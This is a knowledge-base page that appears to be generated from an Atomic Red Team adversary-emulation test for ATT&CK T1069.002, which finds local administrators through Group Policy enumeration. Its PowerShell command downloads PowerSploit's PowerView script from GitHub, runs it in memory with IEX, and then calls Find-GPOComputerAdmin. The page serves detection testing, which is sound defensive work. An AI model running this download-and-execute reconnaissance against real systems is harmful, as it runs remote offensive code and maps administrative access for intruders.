---
atomic_guid: "64fdb43b-5259-467a-b000-1b02c00e510a"
title: "Find Local Admins via Group Policy (PowerView)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1069.002"
attack_technique_name: "Permission Groups Discovery: Domain Groups"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "64fdb43b-5259-467a-b000-1b02c00e510a"
  - "Find Local Admins via Group Policy (PowerView)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Find Local Admins via Group Policy (PowerView)

takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.

## Metadata

- Atomic GUID: 64fdb43b-5259-467a-b000-1b02c00e510a
- Technique: T1069.002: Permission Groups Discovery: Domain Groups
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1069.002/T1069.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1069-permission_groups_discovery|T1069.002]]

## Input Arguments

### computer_name

- description: hostname of the computer to analyze
- type: path
- default: $env:COMPUTERNAME

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.yaml)
